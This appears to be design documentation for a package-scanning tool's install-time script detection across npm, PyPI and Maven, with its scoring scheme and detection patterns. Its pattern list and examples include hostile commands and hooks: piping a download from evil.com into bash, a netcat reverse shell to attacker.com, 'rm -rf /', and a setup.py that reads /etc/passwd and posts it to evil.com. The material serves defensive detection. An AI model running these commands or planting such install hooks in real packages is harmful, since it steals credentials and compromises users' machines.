# Install-Time Execution Detection (Category 4)

## Overview

This document describes the install-time execution detection and scoring implemented in Snyft. Install-time scripts pose a significant supply chain security risk as they execute arbitrary code during package installation, often with elevated privileges.

## Scoring Rubric

Category 4 uses a 0-2 point risk scale:

- **0 risk points (best)**: No install-time scripts detected
- **1 risk point (moderate)**: Single benign install script present
- **2 risk points (worst)**: Multiple scripts OR dangerous operations detected

## Detection Coverage

### npm (JavaScript/Node.js)

Detects and analyzes the following lifecycle scripts:
- `preinstall` - runs before package installation
- `install` - runs during package installation
- `postinstall` - runs after package installation

### Python (PyPI)

Detects and analyzes:
- `setup.py` - fetched from the package repository
- Checks for:
  - `cmdclass` overrides (custom install commands)
  - Network imports (`requests`, `urllib`, `http.client`)
  - Dynamic imports (`__import__`)
  - Standard dangerous patterns

### Java (Maven)

Detects and analyzes dangerous Maven plugins in `pom.xml`:
- `maven-exec-plugin` - executes arbitrary system commands
- `exec-maven-plugin` - alternative exec plugin
- `maven-antrun-plugin` - runs Ant tasks (can execute arbitrary code)
- `groovy-maven-plugin` - executes Groovy scripts
- `sql-maven-plugin` - executes SQL commands
- Checks for lifecycle phase bindings (install, compile, etc.)

## Dangerous Pattern Detection

The analyzer detects 15+ categories of dangerous operations:

### High Severity Patterns

1. **Remote Script Execution**: `curl https://example.com/script.sh | bash`
   - Downloads and executes code without verification

2. **eval() Usage**: `eval(maliciousCode)`
   - Executes arbitrary code dynamically

3. **Sensitive Environment Variables**: `process.env.AWS_SECRET_KEY`
   - Accesses tokens, keys, secrets, passwords, API keys

4. **Executable Downloads**: `wget https://example.com/malware.exe`
   - Downloads executable files (.exe, .dll, .so, .sh, etc.)

5. **Root Directory Deletion**: `rm -rf /`
   - Recursive force delete from root

6. **Config Directory Access**: `~/.ssh/id_rsa`, `~/.aws/credentials`
   - Accesses sensitive user configuration

7. **System Auth Files**: `/etc/passwd`, `/etc/shadow`, `/etc/sudoers`
   - Reads system authentication files

8. **Network Exfiltration Tools**: `nc -e /bin/sh attacker.com 4444`
   - Uses netcat, telnet, or /dev/tcp for data exfiltration

### Medium Severity Patterns

1. **HTTP Downloads**: `curl http://insecure.com/file`
   - Downloads over unencrypted HTTP

2. **Base64 Decoding**: `echo 'encoded' | base64 -d | sh`
   - Decodes base64, potentially hiding malicious code

3. **Permission Changes**: `chmod +x file` or `chmod 777 /path`
   - Makes files executable or grants full permissions

4. **Process Spawning**: `child_process.exec()`, `subprocess.call()`
   - Spawns child processes (potential code execution)

5. **Inline Code Execution**: `node -e "code"`, `python -c "code"`
   - Executes code directly from command line

## Usage Examples

### npm Package Analysis

```javascript
// Benign postinstall (0 points)
{
  "scripts": {
    "postinstall": "node scripts/build-native.js"
  }
}

// Dangerous postinstall (2 points)
{
  "scripts": {
    "postinstall": "curl https://evil.com/backdoor.sh | bash"
  }
}
```

### Python Package Analysis

```python
# Benign setup.py (0 points)
from setuptools import setup
setup(
    name='mypackage',
    version='1.0.0',
)

# Dangerous setup.py (2 points)
from setuptools import setup
from setuptools.command.install import install
import requests

class CustomInstall(install):
    def run(self):
        # Exfiltrates data during installation
        data = open('/etc/passwd').read()
        requests.post('https://evil.com', data=data)
        install.run(self)

setup(
    name='evil-package',
    cmdclass={'install': CustomInstall},
)
```

### Java Package Analysis

```xml
<!-- Benign pom.xml (0 points) -->
<project>
  <build>
    <plugins>
      <plugin>
        <artifactId>maven-compiler-plugin</artifactId>
      </plugin>
    </plugins>
  </build>
</project>

<!-- Dangerous pom.xml (2 points) -->
<project>
  <build>
    <plugins>
      <plugin>
        <artifactId>maven-exec-plugin</artifactId>
        <executions>
          <execution>
            <phase>install</phase>
            <goals><goal>exec</goal></goals>
            <configuration>
              <executable>curl</executable>
              <arguments>
                <argument>https://evil.com/backdoor.sh</argument>
              </arguments>
            </configuration>
          </execution>
        </executions>
      </plugin>
    </plugins>
  </build>
</project>
```

## Implementation Details

### Architecture

1. **Script Fetching**:
   - npm: Scripts extracted from package.json via npm registry API
   - Python: setup.py fetched from GitHub repository
   - Java: pom.xml fetched from GitHub repository

2. **Pattern Matching**:
   - Uses regex-based pattern detection
   - 15+ patterns covering common attack vectors
   - Ecosystem-specific pattern extensions

3. **Risk Scoring**:
   - Analyzes script content for dangerous patterns
   - Counts install-time scripts
   - Calculates risk points based on findings

### Files Modified/Created

- `pkg/analyzer/script_analyzer.go` - Core pattern detection logic
- `pkg/analyzer/analyzer.go` - Updated scoring and integration
- `pkg/models/models.go` - New data structures for analysis results
- `pkg/fetcher/github.go` - Added file content fetching
- `pkg/analyzer/script_analyzer_test.go` - Comprehensive tests (28 test cases)
- `pkg/analyzer/analyzer_test.go` - Integration tests (8 test cases)

## Testing

The implementation includes 36 comprehensive test cases covering:

- npm packages with various dangerous patterns
- Python setup.py with cmdclass overrides and network operations
- Java pom.xml with dangerous Maven plugins
- Scoring logic for all risk levels
- Edge cases (empty scripts, missing files, etc.)

Run tests:
```bash
go test ./pkg/analyzer/... -v
```

All tests pass with 29.2% code coverage in the analyzer package.

## Future Enhancements

Potential improvements:
1. Add support for more package managers (Ruby gems, Rust cargo)
2. Implement machine learning for pattern detection
3. Add configurable pattern lists
4. Support for custom dangerous pattern definitions
5. Enhanced context-aware analysis (distinguish build vs install scripts)
6. Integration with CVE databases for known malicious patterns

## References

- [npm Scripts Documentation](https://docs.npmjs.com/cli/v9/using-npm/scripts)
- [Python setuptools](https://setuptools.pypa.io/en/latest/)
- [Maven Build Lifecycle](https://maven.apache.org/guides/introduction/introduction-to-the-lifecycle.html)
- [OWASP Top 10 CI/CD Security Risks](https://owasp.org/www-project-top-10-ci-cd-security-risks/)
